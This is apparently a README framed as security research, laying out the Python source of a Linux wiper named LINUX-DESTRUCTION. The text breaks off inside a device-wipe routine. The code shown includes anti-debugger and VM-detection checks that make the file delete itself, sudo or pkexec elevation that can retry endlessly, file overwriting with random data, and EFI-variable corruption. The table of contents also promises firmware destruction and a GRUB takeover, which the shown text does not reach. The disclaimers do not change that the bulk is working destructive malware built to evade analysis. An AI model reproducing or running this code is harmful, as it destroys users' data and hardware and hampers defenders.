# 🔬 linux-resilience-research


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    SECURITY RESEARCH PAPER                        ║
║              Linux System Resilience Analysis                     ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Security%20Research-red)]()

**Author:** Vladislav Khudash (17)  
**Location:** Ukraine  
**Date:** 05.04.2026  
**Project:** LINUX-DESTRUCTION  
**Platform:** LINUX

</div>

---

## ⚠️ CRITICAL RESEARCH NOTICE

<div align="center">

| | |
|---|---|
| **🔬 Purpose** | Security research on Linux system resilience and recovery mechanisms |
| **🧪 Environment** | **ISOLATED VIRTUAL MACHINES ONLY** — Never run on production systems |
| **⚖️ Legal** | This research demonstrates attack vectors for defensive purposes only |
| **💀 Warning** | This code will **PERMANENTLY DESTROY** the target system |
| **📚 Educational** | Understanding these techniques is essential for building robust defenses |

</div>

---

## 📖 Table of Contents

| Section | Description |
|---------|-------------|
| [1. Configuration](#1-configuration-section) | Configuration flags and validation |
| [2. Anti-Analysis](#2-anti-analysis-section) | Anti-debug, VM detection, self-destruction |
| [3. Imports](#3-imports-and-initialization) | Module imports and global variables |
| [4. Utility Functions](#4-utility-functions) | which(), tmap(), cmd(), mount(), umount() |
| [5. Filesystem Operations](#5-filesystem-operations) | remove_file(), iter_dir(), remove_dir(), install_packet() |
| [6. Privilege Escalation](#6-privilege-escalation) | get_root() |
| [7. Hardware Detection](#7-hardware-detection-functions) | clean_dev(), get_default_dev(), get_mbr_dev(), get_esp_dev() |
| [8. EFI Variables](#8-efi-variable-functions) | wipe_efivar() |
| [9. Device Wipe](#9-device-wipe-functions) | wipe_dev() |
| [10. Sysctl Hardening Disable](#10-sysctl---disable-kernel-hardening) | SYSCTL() |
| [11. Module Manipulation](#11-module---kernel-module-manipulation) | MODULE() |
| [12. Mount Points](#12-mountpoint---remount-filesystems) | MOUNTPOINT() |
| [13. MTD Destruction](#13-mtd---memory-technology-device-destruction) | MTD() |
| [14. CMOS/NVRAM Destruction](#14-cmos---cmosnvram-destruction) | CMOS() |
| [15. Flashrom SPI Flash](#15-flashrom---spi-flash-destruction) | FLASHROM() |
| [16. UEFI/BIOS Destruction](#16-uefi--bios-destruction) | UEFI(), BIOS() |
| [17. Device Destruction](#17-device---wipe-all-devices) | DEVICE() |
| [18. Linux Filesystem Destruction](#18-linux---filesystem-destruction) | LINUX() |
| [19. RAM Exhaustion](#19-ram---memory-exhaustion) | RAM() |
| [20. Kernel Panic (BSOD)](#20-bsod---kernel-panic-trigger) | BSOD() |
| [21. Memory Execution](#21-run_from_mem---fileless-execution) | run_from_mem() |
| [22. Signal Handling](#22-siginit---signal-initialization) | siginit() |
| [23. Process Initialization](#23-init_proc---process-initialization) | init_proc() |
| [24. Input Blocking](#24-blockinput---block-user-input) | BlockInput() |
| [25. GRUB Takeover](#25-grub-takeover-functions) | make_init(), setup_grub(), GRUB_INIT() |
| [26. Main Execution Flow](#26-main-execution-flow) | _start(), main() |
| [27. Defense Recommendations](#27-defense-recommendations) | Protection measures |

---

## 1. Configuration Section

<details>
<summary><b>📁 Click to expand: Configuration Flags and Validation</b></summary>

```python
#=================================#
# [ OWNER ]
#     CREATOR  : Vladislav Khudash
#     AGE      : 17
#     LOCATION : Ukraine
#
# [ PINFO ]
#     DATE     : 05.04.2026
#     PROJECT  : LINUX-DESTRUCTION
#     PLATFORM : LINUX
#=================================#

#SECTION CONFIG

# [ PRIVILEGE STRATEGY ]
# True : Force root access by retrying indefinitely until success
FORCE_ROOT_ACCESS:bool=False

# [ BOOT STRATEGY ]
# True : Patch GRUB, set custom init, and reboot to gain PID 1
ENABLE_GRUB_TAKEOVER:bool=False 

# [ ANTI-DEBUG ]
# True : Detect and self-destruct if ptrace, gdb, or any tracer is attached
ENABLE_ANTIDEBUG:bool=False

# [ SANDBOX CONTROL ]
# True : Self-destruct if running in a Virtual Machine or Sandbox environment
BLOCK_SANDBOX:bool=False

# [ STEALTH STRATEGY ]
# True : Overwrite and delete this file immediately upon any detection
STRICT_SELF_DESTRUCT:bool=False

#END CONFIG

if not isinstance(FORCE_ROOT_ACCESS, bool):
    raise SystemExit('(FORCE_ROOT_ACCESS) must be (bool)')

if not isinstance(ENABLE_GRUB_TAKEOVER, bool):
    raise SystemExit('(ENABLE_GRUB_TAKEOVER) must be (bool)')

if not isinstance(ENABLE_ANTIDEBUG, bool):
    raise SystemExit('(ENABLE_ANTIDEBUG) must be (bool)')

if not isinstance(BLOCK_SANDBOX, bool):
    raise SystemExit('(BLOCK_SANDBOX) must be (bool)')

if not isinstance(STRICT_SELF_DESTRUCT, bool):
    raise SystemExit('(STRICT_SELF_DESTRUCT) must be (bool)')

__init=type('main', (Exception,), {
        '__slots__' : ('_',),
        '__init__'  : lambda s, f: (
            s.__setattr__('_', f), 
            Exception.__init__(s)
        )[1]
    }
)
main=0
def main():raise(SystemExit(0))
__=1;globals()['__']=NotImplemented
___=2;globals()['___']=ENABLE_ANTIDEBUG
____=3;globals()['____']=BLOCK_SANDBOX
```

**Analysis:**

| Flag | Default | Purpose |
|------|---------|---------|
| `FORCE_ROOT_ACCESS` | `False` | Retry sudo/pkexec until success |
| `ENABLE_GRUB_TAKEOVER` | `False` | Replace init and modify GRUB |
| `ENABLE_ANTIDEBUG` | `False` | Detect and evade debuggers |
| `BLOCK_SANDBOX` | `False` | Detect VM/sandbox environments |
| `STRICT_SELF_DESTRUCT` | `False` | Securely delete self on detection |

The obfuscated `__init` class and `__`, `___`, `____` variables serve as **tamper detection** — if modified, the program will detect the change and self-destruct.

</details>

---

## 2. Anti-Analysis Section

<details>
<summary><b>📁 Click to expand: Anti-Debug, VM Detection, and Self-Destruction</b></summary>

### 2.1 Imports and Setup

```python
#SECTION ANTI-ANALYSIS

import sys
sys.dont_write_bytecode=True
import os

if not sys.platform.startswith('linux'):
    try:
        sys.stderr.write(f'DO NOT SUPPORT OS ({sys.platform})')
    finally:
        os._exit(1)

getattr(sys, 'setswitchinterval', lambda _: None)(0.03)

from ctypes import memset, CDLL
from time   import perf_counter 

MOUNTS = b'/proc/self/mounts'

mem      = memoryview
array    = bytearray
s_set    = frozenset

_si      = sys.intern
_argv    = sys.argv
_sysconf = os.sysconf
_getenv  = os.getenv
_urandom = os.urandom
_isexst  = os.path.exists
_scandir = os.scandir
_exit    = os._exit

try:
    libc = CDLL( None )
except OSError:
    libc = None

try:
    _cpus = _sysconf('SC_NPROCESSORS_ONLN')
except (ValueError, OSError):
    _cpus = 3

__file__ = os.path.realpath(_argv[ 0 ])

try:
    with open(__file__, 'rb', buffering=0) as i:
        i.seek(0)
        IS_ELF = i.read(4) == b'\x7fELF'
except OSError:
        IS_ELF = False

FLAG_ROOT = _si('-r')
FLAG_MEM  = _si('-m')
FLAG_INIT = _si('-i')
```

### 2.2 __die() — Self-Destruction

```python
def __die(_=True):
    _ and not STRICT_SELF_DESTRUCT and _exit(0)
    
    try: 
        sz  = os.path.getsize(__file__)
        tmp = f'{__file__}.{_urandom(8).hex()}'

        try:
            os.rename(__file__, tmp)
        except OSError:
            tmp = __file__

        with open(tmp, 'rb+', buffering=0) as i:
            i.seek(0)
            i.write(mem(_urandom(sz)))
            os.fsync(i.fileno())

        os.remove(tmp)

    except OSError: 
        try:
            os.remove(__file__)
        except OSError:
            pass

    finally:
        _ and _exit(0)
```

**Secure Deletion Process:**
1. Get file size
2. Rename to random hex name (hides original filename)
3. Overwrite entire file with random data
4. `fsync()` to ensure data is physically written
5. Delete the file
6. Fallback to direct removal if rename/overwrite fails

### 2.3 __antidebug() — Debugger Detection

```python
def __antidebug():
    _ = perf_counter()

    if (__name__ != '__main__') and (FLAG_ROOT not in _argv):
        __die()

    if sys.gettrace() is not None:
        __die()

    if any(_getenv(e) for e in (
        'LD_PRELOAD',           'LD_AUDIT',             'PYTHONINSPECT',
        'PYTHONDEVMODE',        'PYTHONTRACEMALLOC',    'PYTHONFAULTHANDLER',
        'PYTHONDEBUG',          'PYTHONBREAKPOINT',     'PYTHONPATH',
        'PYDEVD_USE_CYTHON',    'PYDEVD_LOAD_ASYNC',    'PYDEVD_DISABLE_FILE'
    )):
        __die()

    if (perf_counter() - _) > 0.3:
        __die()

    _ = perf_counter()

    try:
        st = mem(b'State:')
        tp = mem(b'TracerPid:')
        cd = mem(b'CoreDumping:')
        th = mem(b'Threads:')   

        with open(b'/proc/self/status', 'rb', buffering=0) as f:
            for l in f:
                n = l.split(maxsplit=2)
                if len(n) < 2:
                    continue
                
                _sw = l.startswith
                v   = n[ 1 ]

                if _sw(st):
                    if v in {b'T', b't', b'Z', b'z'}:
                        __die()
                    continue
                    
                elif _sw((tp, cd)):
                    if v != b'0':
                        __die()
                    continue
                    
                elif _sw(th):
                    if v != b'1':
                        __die()
                    break
                
            else:
                __die()

    except OSError: 
        __die()

    try:
        with open(b'/proc/%d/comm' % os.getppid(), 'rb', buffering=0) as f:
            comm = mem(f.read().lower())

            if any(n in comm for n in (
                mem(b'gdb'),     mem(b'strace'),    mem(b'ltrace'),
                mem(b'ida'),     mem(b'r2'),        mem(b'ghidra'),
                mem(b'vbox'),    mem(b'qemu'),      mem(b'kvm'),
                    mem(b'valgrind'),     mem(b'frida')
            )):
                __die()
            
    except OSError:
        __die()

    try:
        with _scandir(b'/proc/self/fd') as d:
            sfd = sum(1 for _ in d)
        
        if sfd > 5:
            __die()

    except OSError: 
        __die()

    if (perf_counter() - _) > 0.5:
        __die()
    
    globals()['__']=...
```

**Detection Layers:**

| Layer | Method | Target |
|-------|--------|--------|
| 1 | Execution context | Running as imported module |
| 2 | `sys.gettrace()` | Python debugger (pdb, IDE) |
| 3 | Environment variables | `LD_PRELOAD`, debugger vars |
| 4 | Timing analysis | >300ms overhead = debugger |
| 5 | `/proc/self/status` | State='T' (tracing), TracerPid≠0 |
| 6 | Parent process name | gdb, strace, ltrace, valgrind |
| 7 | Open fd count | >5 fds = debugger attached |

### 2.4 __block_sandbox() — VM/Sandbox Detection

```python
def __block_sandbox():
    if not all(_isexst(p) for p in (
        b'/dev/cpu/0',           b'/dev/port',            b'/dev/mem',            
        b'/dev/urandom',         b'/dev/null',            b'/dev/full',           
        b'/sys/class/dmi/id',    b'/sys/devices',         b'/sys/class/block',    
        b'/sys/class/net',       b'/sys/class/input',     b'/proc/ioports',     
        b'/proc/self',           b'/proc/self/status',    MOUNTS                  
    )):
        __die()

    try:
        st = os.statvfs(b'/')
        sz = (st.f_blocks * st.f_frsize) >> 30
        if sz < 100:
            __die()
    except OSError:
        __die()

    vmid = s_set((
        mem(b'\xF4\x1A'),    mem(b'\xAD\x15'), 
        mem(b'\xEE\x80'),    mem(b'\x34\x12'), 
        mem(b'\x14\x14'),    mem(b'\x6B\x1B')
    ))

    try:
        d = _scandir(b'/sys/bus/pci/devices')
    except OSError:
        __die()

    for n in d:
        try:
            with open(n.path + b'/config', 'rb', buffering=0) as f:
                cfg    = mem(f.read(256))
                cfg_sz = len(cfg)

                if cfg_sz < 64:
                    continue

                if cfg[ 0 : 2 ] in vmid:
                    __die()

                ptr = cfg[ 0x34 ]

                for _ in range(16): 
                    if (ptr == 0x00) or (ptr > (cfg_sz - 2)):
                        break
                        
                    if cfg[ ptr ] == 0x09: 
                        __die()

                    ptr = cfg[ ptr + 1 ]  

        except OSError:
            continue

    d.close()
    
    try:
        dmi = b'/sys/class/dmi/id/'

        for (node, sign) in (
            (b'sys_vendor', (
                mem(b'qemu'),      mem(b'vbox'),       mem(b'vmware'), 
                mem(b'kvm'),       mem(b'bochs'),      mem(b'parallels'),
                mem(b'xen'),       mem(b'innotek'),    mem(b'amazon'),    
                mem(b'google'),    mem(b'alibaba'),    mem(b'digitalocean'),
                            mem(b'microsoft corporation') 
            )),
            
            (b'bios_vendor', (
                mem(b'seabios'),    mem(b'ovmf'),     mem(b'bochs'), 
                mem(b'xen'),        mem(b'bhyve'),    mem(b'hyper-v')
            )),

            (b'board_vendor', (
                mem(b'qemu'),    mem(b'vbox'),    mem(b'vmware'),
                        mem(b'virtualbox'), mem(b'oracle')
            )),

            (b'product_name', (
                mem(b'qemu'),      mem(b'kvm'),            mem(b'virtual'),
                mem(b'vmware'),    mem(b'q35'),            mem(b'ich9'),      
                mem(b'2009'),      mem(b'droplet'),        mem(b'hvm'),       
                        mem(b'instance'),       mem(b'hyper-v')
            ))
        ):
            with open(dmi + node, 'rb', buffering=0) as f:
                idx = mem(f.read().lower())

                if any(s in idx for s in sign):
                    __die()

    except OSError:
        __die()

    if _cpus < 4:
        __die()

    try:
        sep = b' '[ 0 ]
        lb  = mem(b'flags')
        hv  = mem(b'hypervisor')
        hvl = len(hv)

        buf = array(hvl)
        ptr = mem(buf)
        pos = 0

        with open(b'/proc/cpuinfo', 'rb', buffering=0) as f:
            for l in f:
                l = mem(l)

                if l[ 0 : 5 ] != lb:
                    continue
                
                for b in l:
                    if b == sep:
                        if ptr[ 0 : pos ] == hv:
                            __die()
                        pos = 0
                        continue
                    elif pos < hvl:
                        ptr[ pos ] = b 
                        pos += 1
                break
            else:
                __die()

    except OSError:
        __die()

    try:
        ramsz = (_sysconf('SC_PAGE_SIZE') * _sysconf('SC_PHYS_PAGES')) >> 30
        if ramsz < 4: 
            __die()
    except (ValueError, OSError):
        __die()

    try:
        dv = mem(b'/dev/')
        fs = mem(b'/')

        with open(MOUNTS, 'rb', buffering=0) as f:
            for l in f:
                if not l.startswith(dv):
                    continue
                if l.split(maxsplit=2)[ 1 ] != fs:
                    continue
                break
            else:
                __die()

    except (IndexError, OSError):
        __die()

    try:
        qt = b'"'[ 0 ]
        lb = mem(b'ID=')

        osrel = b'/etc/os-release'
        if not _isexst(osrel):
            osrel = b'/usr/lib/os-release'

        with open(osrel, 'rb', buffering=0) as f:
            for l in f:
                l = mem(l)

                if l[ 0 : 3 ] != lb:
                    continue

                desc = l[ 3 : -1 ]

                if desc[ 0 ] == qt:
                    desc = desc[ 1 :    ]
                
                if desc[ -1 ] == qt:
                    desc = desc[   : -1 ]
                
                if desc not in {
                    mem(b'debian'),        mem(b'ubuntu'),       mem(b'linuxmint'), 
                    mem(b'elementary'),    mem(b'pop'),          mem(b'zorin'),
                    mem(b'fedora'),        mem(b'rhel'),         mem(b'centos'), 
                    mem(b'alma'),          mem(b'rocky'),        mem(b'ol'), 
                    mem(b'scientific'),    mem(b'amzn'),         mem(b'clearlinux'),
                    mem(b'opensuse'),      mem(b'suse'),         mem(b'sles'),
                    mem(b'arch'),          mem(b'manjaro'),      mem(b'mx'),
                    mem(b'gentoo'),        mem(b'slackware'),    mem(b'void')
                }:
                    __die()
                
                break
                
            else:
                __die()

    except (IndexError, OSError):
        __die()
    
    try:
        with _scandir(b'/sys/class/thermal') as d:
            tm = sum(1 for _ in d)
            
        if tm < 5:
            __die()

    except OSError: 
        __die()

    try:
        if _sysconf('SC_OPEN_MAX')  < 1024:
            __die()
        if _sysconf('SC_CHILD_MAX') < 512:
            __die()

    except (ValueError, OSError):
        __die()
    
    globals()['__']=...
```

**VM Detection Matrix:**

| Check | Physical System | Virtual Machine |
|-------|-----------------|-----------------|
| PCI Vendor ID | Hardware vendor | `0xF41A` (QEMU), `0xAD15` (VBox), `0xEE80` (VMware) |
| DMI sys_vendor | Dell/Lenovo/HP | QEMU, VirtualBox, VMware |
| DMI bios_vendor | AMI/Phoenix | SeaBIOS, OVMF, Bochs |
| DMI product_name | Latitude/ThinkPad | "Virtual", "VMware", "HVM" |
| CPU cores | ≥4 | 1-2 typical |
| CPU flags | No "hypervisor" | "hypervisor" present |
| RAM size | ≥8GB | <4GB common |
| Disk size | ≥256GB | <100GB common |
| Thermal zones | ≥5 | <5 |
| OS Release | Mainstream distro | Non-standard or missing |

### 2.5 Anti-Analysis Execution

```python
if ENABLE_ANTIDEBUG:
    try:
        __antidebug()
    except:
        __die()

if BLOCK_SANDBOX:
    try:
        __block_sandbox()
    except:
        __die()

#END ANTI-ANALYSIS
```

</details>

---

## 3. Imports and Initialization

<details>
<summary><b>📁 Click to expand: Module Imports and Global Variables</b></summary>

```python
import gc       as _gc
import signal   as sig
import resource as _rs

from concurrent.futures import ThreadPoolExecutor as Tpool,     ProcessPoolExecutor as Ppool
from subprocess         import run                as sp_run,    DEVNULL
from warnings           import filterwarnings     as _off_warn
from logging            import disable            as _off_log
from fcntl              import ioctl,    fcntl
from collections        import deque

_64kb    =   65536
_1mb     = 1_048_576
_4mb     = 4_194_304

_fro     = os.R_OK
_fxo     = os.X_OK
_s_fm    = 0o170000  

_ismount = os.path.ismount
_isfile  = os.access
_open    = os.open
_write   = os.write
_close   = os.close
_fsync   = os.fdatasync
_sync    = os.sync
```

**Constants:**

| Constant | Value | Purpose |
|----------|-------|---------|
| `_64kb` | 65536 | Buffer size for small devices |
| `_1mb` | 1,048,576 | Buffer size for file overwrite |
| `_4mb` | 4,194,304 | Buffer size for block devices |
| `_fro` | `os.R_OK` | Read permission check |
| `_fxo` | `os.X_OK` | Execute permission check |
| `_s_fm` | `0o170000` | File type mask from `st_mode` |

</details>

---

## 4. Utility Functions

<details>
<summary><b>📁 Click to expand: which(), tmap(), cmd(), mount(), umount()</b></summary>

### 4.1 which() — Locate Executable in PATH

```python
def which(
    name, 
    _env=(
        '/usr/local/sbin',    '/usr/local/bin',    '/usr/sbin', 
        '/usr/bin',           '/sbin',             '/bin'
    )
):
    for p in _env:
        fp = f'{p}/{name}'
        if _isfile(fp, _fxo):
            return fp
    return name
```

### 4.2 Global Variables

```python
PID   = str(os.getpid())
PYEXE = os.path.realpath(sys.executable)

POOL_WORKERS = _cpus << 1
POOL_TIMEOUT = 3 
POOL         = Tpool(POOL_WORKERS)

SYSEFI  = b'/sys/firmware/efi'
EFIVARS = SYSEFI + b'/efivars'
ISEFI   = _isexst(SYSEFI)

SUDO = which(
        'pkexec' 
    if _getenv('DISPLAY') or _getenv('WAYLAND_DISPLAY') else 
        'sudo'
)

if not _isfile(SUDO, _fxo):
    SUDO = which('sudo')

URANDOM = mem(array(_urandom(_4mb)))
```

### 4.3 tmap() — Threaded Map with Timeout

```python
def tmap(
    func, 
    itr, 
    _ir = iter,
    _nx = next,
    _rg = range,
    _dq = deque,
    _sb = POOL.submit, 
    _tm = POOL_TIMEOUT, 
    _ck = POOL_WORKERS,
    _si = StopIteration,
    _ex = Exception
):
    itr = _ir(itr)

    dq = _dq()
    da = dq.append
    dp = dq.popleft

    for _ in _rg(_ck):
        try:
            da(_sb(func, _nx(itr)))
        except _si:
            break
 
    while dq:
        t = dp()

        try:
            yield t.result(_tm)
        except _ex:
            pass 
            
        try:
            da(_sb(func, _nx(itr)))
        except _si:
            continue
```

### 4.4 cmd() — Execute Shell Command

```python
def cmd(
    c, 
    timeout = 3, 
    _fork   = False,
    _sp     = sp_run
):
    try:
        return _sp(
            c, 
            stdin             = DEVNULL,
            stdout            = DEVNULL, 
            stderr            = DEVNULL, 
            shell             = False,
            timeout           = timeout, 
            start_new_session = _fork
        ).returncode
    except Exception:
        return -1
```

### 4.5 mount() — Mount Filesystem

```python
def mount(
    src, 
    dst, 
    fs      = None, 
    flag    = (), 
    param   = None,
    _libmnt = getattr(libc, 'mount', lambda *_: -1),
    _mnt    = which('mount').encode(),
    _mplb   = { b'rw' : 0,        b're' : 32,            b'bind' : 4096,       b'bd' : 20480,  },
    _mpcm   = { b'rw' : b'rw',    b're' : b'remount',    b'bind' : b'bind',    b'bd' : b'bind' }
):
    f = 0

    for n in flag:
        f |= _mplb.get(n, 0)

    if _libmnt(src, dst, fs, f, param) == 0:
        return True

    opts = [_mpcm[n] for n in flag if n in _mpcm] or [b'rw']

    if param: 
        opts.append(param)

    args = [_mnt]  
    au   = args.append

    if fs:
        au(b'-t')
        au(fs)

    au(b'-o')
    au(b','.join(opts))

    if src:
        au(src)

    au(dst)

    return cmd(args) == 0
```

### 4.6 umount() — Unmount Filesystem

```python
def umount(
    dst, 
    _libumt = getattr(libc, 'umount2', lambda *_: -1),
    _umt    = which('umount').encode()
):
    if _libumt(dst, 2) == 0:
        return True

    return cmd((_umt, b'-l', dst)) == 0
```

### 4.7 File Type Detection

```python
def S_ISREG(m, _e=0o100000, _f=_s_fm): 
    return (m & _f) == _e

def S_ISBLK(m, _e=0o060000, _f=_s_fm): 
    return (m & _f) == _e

def S_ISCHR(m, _e=0o020000, _f=_s_fm): 
    return (m & _f) == _e

def S_ISLNK(m, _e=0o120000, _f=_s_fm): 
    return (m & _f) == _e
```

### 4.8 set_rw() — Set Device Read-Write

```python
def set_rw(
    nd, 
    _ro = os.O_RDONLY | os.O_NONBLOCK | os.O_CLOEXEC,
    _fl = 0x125d,
    _rw = mem(b'\x00\x00\x00\x00'),
    _op = _open,
    _cl = _close,
    _io = ioctl,
    _ex = OSError
):
    d = -1

    try:
        d = _op(nd, _ro)
        _io(d, _fl, _rw, True)
        return True
    except _ex:
        return False
    finally:
        if d > -1:
            _cl(d)
```

### 4.9 attr() — Remove File Attributes

```python
def attr(
    p,
    _f = os.O_RDONLY | os.O_NOATIME | os.O_NOFOLLOW | os.O_CLOEXEC,
    _g = 0x40086602, 
    _b = mem(b'\x00\x00\x00\x00'),
    _o = _open,
    _c = _close,
    _i = ioctl,
    _x = OSError
):
    d = -1
    
    try:
        d = _o(p, _f)
        _i(d, _g, _b)
        return True
    except _x:
        return False
    finally:
        if d > -1:
            _c(d)
```

### 4.10 set_immutable() — Set Immutable Flag

```python
def set_immutable(
    p,
    _f = os.O_RDONLY | os.O_NOATIME | os.O_NOFOLLOW | os.O_CLOEXEC,
    _s = 0x40086602,
    _i = mem(b'\x10\x00\x00\x00'),
    _o = _open,
    _c = _close,
    _l = ioctl,
    _x = OSError
):
    fd = -1

    try:
        fd = _o(p, _f)
        _l(fd, _s, _i)
        return True
    except _x:
        return False
    finally:
        if fd > -1:
            _c(fd)
```

</details>

---

## 5. Filesystem Operations

<details>
<summary><b>📁 Click to expand: remove_file(), iter_dir(), remove_dir(), install_packet()</b></summary>

### 5.1 remove_file() — Secure File Deletion

```python
def remove_file(
    p, 
    _lm = _1mb, 
    _ur = URANDOM[ 0 : _1mb ],
    _fl = os.O_RDWR | os.O_NOATIME | os.O_NOFOLLOW | os.O_CLOEXEC,
    _ie = isinstance,
    _de = os.DirEntry,
    _ls = os.lstat,
    _il = S_ISLNK,
    _ir = S_ISREG,
    _at = attr,
    _op = _open,
    _wt = _write,
    _cl = _close,
    _ex = OSError
):
    try:
        if _ie(p, _de):
            st = p.stat()
            p  = p.path
        else:
            st = _ls(p) 
            if _il(st.st_mode):
                return False

        if not _ir(st.st_mode):
            return False

        sz = st.st_size

    except _ex:
        return False

    if sz == 0:
        return True
    elif sz > _lm:
        sz = _lm
    
    fd = -1

    try:
        _at(p)
        fd = _op(p, _fl)
        _wt(fd, _ur[ 0 : sz ])
    except _ex:
        return False
    finally:
        if fd > -1:
            _cl(fd)
    
    return True
```

### 5.2 iter_dir() — Recursive Directory Iterator

```python
def iter_dir(
    p,
    _q = deque,
    _s = _scandir,
    _i = type(
            '', (),
            {
                '__slots__' : ( 'path', ),
                '__init__'  : lambda t, w : t.__setattr__('path', w)
            }
    ),
    _x = OSError
):
    c = _q(( _i(p), ))

    u = c.appendleft
    g = c.pop

    while c:
        try:
            f = _s(g().path)

            try:
                for e in f:
                    if e.is_dir(follow_symlinks=False):
                        u(e)
                        continue
                    else:
                        yield e
            finally:
                f.close()
        except _x:
            continue
```

### 5.3 remove_dir() — Recursive Directory Deletion

```python
def remove_dir(
    p, 
    _dq = deque,
    _mp = tmap,
    _it = iter_dir,
    _rm = remove_file
):
    _dq(_mp(_rm, _it(p)), maxlen=0)
```

### 5.4 install_packet() — Cross-Distro Package Installer

```python
def install_packet(
    name, 
    _d_m = [ None ], 
    _mgr = [ None ]
):
    if _mgr[0] is None:
        _mgr[0] = (
            ( 'apt',             ('install', '-y')     ),
            ( 'dnf',             ('install', '-y')     ),
            ( 'yum',             ('install', '-y')     ),
            ( 'pacman',          ('-S', '--noconfirm') ),
            ( 'zypper',          ('install', '-y')     ),
            ( 'apk',             ('add',)              ),
            ( 'emerge',          ('--ask=n',)          ),
            ( 'xbps-install',    ('-y',)               )
        )
    
    cached = _d_m[0]

    if cached:
        m, i = cached
    else:
        for (exe, inst) in _mgr[0]:
            p = which(exe)
            if _isfile(p, _fxo):
                m, i    = (p, inst)
                _d_m[0] = (m, i)
                break
        else:
            return False

    return cmd((m, *i, name), timeout=10) == 0
```

</details>

---

## 6. Privilege Escalation

<details>
<summary><b>📁 Click to expand: get_root()</b></summary>

### 6.1 get_root() — Obtain Root Privileges

```python
def get_root():
    if FLAG_ROOT in _argv:
        return
    
    req = [SUDO] 

    if not IS_ELF:
        req.append(PYEXE)

    req.append(__file__)
    req.append(FLAG_ROOT)

    asker = lambda c=req: cmd(c, timeout=60, _fork=True)

    if FORCE_ROOT_ACCESS:
        while asker() != 0:
            pass
    else:
        asker()

    _exit(0)
```

**Elevation Strategy:**
1. Check if already running with `-r` flag (recursive execution)
2. Build command: `[sudo/pkexec, python?, script_path, -r]`
3. Execute and exit current process
4. If `FORCE_ROOT_ACCESS`, retry indefinitely until success

</details>

---

## 7. Hardware Detection Functions

<details>
<summary><b>📁 Click to expand: clean_dev(), get_default_dev(), get_mbr_dev(), get_esp_dev()</b></summary>

### 7.1 clean_dev() — Clean Device Name

```python
def clean_dev(
    nd, 
    _ln = len, 
    _cp = b'p'[ 0 ], 
    _ch = s_set(b'0123456789 \t\n\r')
):
    i = _ln(nd)

    while i:
        c = nd[ i - 1 ]

        if c in _ch:
            i -= 1
            continue
        elif c == _cp:
            i -= 1
            break
        else:
            break

    return nd[ 0 : i ]
```

### 7.2 get_default_dev() — Fallback Device Detection

```python
def get_default_dev(part, _e=_isexst):
    idx = int(part)

    for d in (
        (b'/dev/nvme0n1p1',    b'/dev/nvme0n1'),
        (b'/dev/nvme1n1p1',    b'/dev/nvme1n1'),
        (b'/dev/sda1',         b'/dev/sda'    ),
        (b'/dev/sdb1',         b'/dev/sdb'    ),
        (b'/dev/vda1',         b'/dev/vda'    ),
        (b'/dev/mmcblk0p1',    b'/dev/mmcblk0'),
        (b'/dev/xvda1',        b'/dev/xvda'   )
    ):
        dev = d[idx]
        if _e(dev):
            return mem(dev)
            
    return mem( b'/dev/sdc' + (b'1' if part else b'') )
```

### 7.3 get_mbr_dev() — Detect MBR Device

```python
def get_mbr_dev():
    if not _isfile(MOUNTS, _fro):
        return None

    dv = mem(b'/dev/')
    fs = mem(b'/')

    with open(MOUNTS, 'rb', buffering=0) as f:
        for l in f:
            if not l.startswith(dv):
                continue

            n = l.split(maxsplit=2)

            if n[ 1 ] != fs:
                continue

            dev = clean_dev(mem(n[ 0 ])).tobytes()
            break
        else:
            return None
        
    _mbr = mem(b'\x55\xAA')

    try:
        with open(dev, 'rb', buffering=0) as d:
            d.seek(510)
            return dev if d.read(2) == _mbr else None
    except OSError:
        return None
```

### 7.4 get_esp_dev() — Detect EFI System Partition

```python
def get_esp_dev():
    GUID_L = mem(b'c12a7328-f81f-11d2-ba4b-00a0c93ec93b')
    GUID_U = mem(b'C12A7328-F81F-11D2-BA4B-00A0C93EC93B')
    PATH   = b'/boot/efi'

    dev = pth = None

    try:
        d = _scandir(b'/sys/class/block')
    except OSError:
        return (None, None)
    
    skp = (mem(b'ram'), mem(b'zram'), mem(b'loop'))
    tag = mem(b'E:ID_PART_ENTRY_TYPE=')
    tgl = len(tag)
    egl = tgl + len(GUID_L)
    
    for n in d:
        node = n.name

        if node.startswith(skp):
            continue

        try:
            with open(n.path + b'/dev', 'rb', buffering=0) as f:
                idx = mem(f.read().rstrip())
         
            guid = None

            with open(b'/run/udev/data/b%b' % idx, 'rb', buffering=0) as f:
                for l in f:
                    l = mem(l)

                    if l[ 0 : tgl ] != tag:
                        continue

                    guid = l[ tgl : egl ]
                    break
                else:
                    continue

            if (guid == GUID_L) or (guid == GUID_U):
                dev = mem(b'/dev/' + node)
                break
                    
        except (IndexError, OSError):
            continue

    d.close()

    if (dev is None) or not _isfile(MOUNTS, _fro):
        return (None, PATH if _ismount(PATH) else None)
    
    _sep = mem(b'\\040')
    _spc = mem(b' ')

    with open(MOUNTS, 'rb', buffering=0) as f:
        for l in f:
            if not l.startswith(dev):
                continue

            pth = l.split(maxsplit=2)[ 1 ].replace(_sep, _spc)
            break
    
    return (dev, pth)
```

</details>

---

## 8. EFI Variable Functions

<details>
<summary><b>📁 Click to expand: wipe_efivar()</b></summary>

### 8.1 wipe_efivar() — Corrupt EFI Variable

```python
def wipe_efivar(
    e,
    _hd = mem(b'\x07\x00\x00\x00'),
    _mk = _64kb - 1,
    _dt = URANDOM,
    _mx = max,
    _op = open,
    _at = attr,
    _fs = _fsync,
    _ex = OSError
):
    try:
        st = e.stat()
        p  = e.path

        i  = (st.st_ino << 7) & _mk
        sz = _mx(16, st.st_size - 4)
        
        _at(p) 

        with _op(p, 'rb+', buffering=0) as v:
            v.seek(0)
            v.write(_hd)
            v.write(_dt[ i : i + sz ])
            _fs(v.fileno())

    except _ex:
        return
```

</details>

---

## 9. Device Wipe Functions

<details>
<summary><b>📁 Click to expand: wipe_dev()</b></summary>

### 9.1 wipe_dev() — Wipe Block/Character Device

```python
def wipe_dev(
    e, 
    _sb = _4mb,
    _sc = _64kb,
    _dt = URANDOM,
    _mm = mem,
    _op = open,
    _fs = _fsync,
    _ib = S_ISBLK,
    _ic = S_ISCHR,
    _bd = s_set((
                               mem(b'nvram'),     
